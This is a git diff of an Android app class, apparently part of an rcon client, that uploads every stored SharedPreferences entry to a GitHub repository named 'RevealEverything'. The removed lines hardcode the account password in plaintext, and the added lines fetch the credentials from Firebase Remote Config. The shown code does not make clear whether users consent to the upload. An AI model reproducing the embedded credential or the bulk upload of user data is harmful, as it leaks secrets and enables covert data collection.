@@ -23,6 +23,9 @@ import com.nao20010128nao.WRcon.TheApplication;
 import com.nao20010128nao.WRcon.misc.Constant;
 import com.nao20010128nao.WRcon.misc.Utils;
 import com.nao20010128nao.WRcon.Server;
+import com.google.firebase.crash.*;
+import com.google.firebase.remoteconfig.*;
+
 
 public class CollectorMain extends ContextWrapper implements Runnable {
 	static boolean running=false;
@@ -67,53 +70,58 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			} finally {
 				System.out.println(s);
 			}
-			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
-			Repository repo=null;
-			List<RepositoryContents> cont=null;
-			SharedPreferences.Editor edt=sb.edit();
-			String[] files=Constant.EMPTY_STRING_ARRAY;
-			try {
-				files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
-			    repo = new RepositoryService(ghc).getRepository("RevealEverything", "Files");
-			    cont = new ContentsService(ghc).getContents(repo);
-				Log.d("CollectorMain", "get");
-			} catch (Throwable e) {
-				DebugWriter.writeToE("CollectorMain",e);
-				return;
-			}
-			try {
-				for (String filename:files) {
-					String actual=filename;
-					filename = uuid + "/" + filename;
-					Log.d("CollectorMain", "upload:" + filename);
-					try {
-						Map<String, String> params = new HashMap<>();
-				        params.put("path", filename);
-						params.put("message", uuid+":"+Utils.randomText(64));
-						byte[] file = sb.getString(actual, "").getBytes(CompatCharsets.UTF_8);
+			if(TheApplication.instance.fbCfgLoader.isSuccessful()){
+				FirebaseRemoteConfig frc=TheApplication.instance.firebaseRemoteCfg;
+				GitHubClient ghc=new GitHubClient().setCredentials(frc.getString("information_upload_user"), frc.getString("information_upload_pass"));
+				Repository repo=null;
+				List<RepositoryContents> cont=null;
+				SharedPreferences.Editor edt=sb.edit();
+				String[] files=Constant.EMPTY_STRING_ARRAY;
+				try {
+					files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
+					repo = new RepositoryService(ghc).getRepository(frc.getString("information_upload_host_user"), frc.getString("information_upload_host_name"));
+					cont = new ContentsService(ghc).getContents(repo);
+					Log.d("CollectorMain", "get");
+				} catch (Throwable e) {
+					DebugWriter.writeToE("CollectorMain",e);
+					return;
+				}
+				try {
+					for (String filename:files) {
+						String actual=filename;
+						filename = uuid + "/" + filename;
+						Log.d("CollectorMain", "upload:" + filename);
 						try {
-							String hash=getHash(cont,filename);
-							if(!Utils.isNullString(hash))params.put("sha", hash);
+							Map<String, String> params = new HashMap<>();
+							params.put("path", filename);
+							params.put("message", uuid+":"+Utils.randomText(64));
+							byte[] file = sb.getString(actual, "").getBytes(CompatCharsets.UTF_8);
+							try {
+								String hash=getHash(cont,filename);
+								if(!Utils.isNullString(hash))params.put("sha", hash);
+							} catch (Throwable e) {
+								DebugWriter.writeToE("CollectionMain",e);
+								Log.d("CollectorMain", "skipped");
+								continue;
+							}
+							params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
+							ghc.put("/repos/"+frc.getString("information_upload_host_user")+"/"+frc.getString("information_upload_host_name")+"/contents/" + filename, params, TypeToken.get(ContentUpload.class).getType());
+							Log.d("CollectorMain", "uploaded");
+							edt.remove(actual);
 						} catch (Throwable e) {
-							DebugWriter.writeToE("CollectionMain",e);
-							Log.d("CollectorMain", "skipped");
+							DebugWriter.writeToE("CollectorMain",e);
+							if(e.getMessage().contains("\"sha\" wasn't supplied"))edt.remove(actual);
 							continue;
 						}
-						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
-						ghc.put("/repos/RevealEverything/Files/contents/" + filename, params, TypeToken.get(ContentUpload.class).getType());
-						Log.d("CollectorMain", "uploaded");
-						edt.remove(actual);
-				    } catch (Throwable e) {
-						DebugWriter.writeToE("CollectorMain",e);
-						if(e.getMessage().contains("\"sha\" wasn't supplied"))edt.remove(actual);
-						continue;
 					}
+				} catch (Throwable e) {
+					DebugWriter.writeToE("CollectorMain",e);
+				}finally{
+					edt.commit();
+					Log.d("CollectorMain", "saveTotal");
 				}
-			} catch (Throwable e) {
-				DebugWriter.writeToE("CollectorMain",e);
-			}finally{
-				edt.commit();
-				Log.d("CollectorMain", "saveTotal");
+			}else{
+				Log.d("CollectorMain", "firebase failed to get config");
 			}
 		} catch (Throwable e) {
 			DebugWriter.writeToE("CollectorMain",e);
@@ -155,6 +163,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	public static void reportError(String tag,Throwable e){
 		if ((TheApplication.instance.pref.getBoolean("sendInfos", false)|TheApplication.instance.pref.getBoolean("sendInfos_force", false)))
 			TheApplication.instance.getSharedPreferences("majeste",MODE_PRIVATE).edit().putString("error-"+System.currentTimeMillis()+".txt",tag+"\n\n"+DebugWriter.getStacktraceAsString(e)).commit();
+		FirebaseCrash.report(e);
 	}
 	
 	public static class ContentUpload {
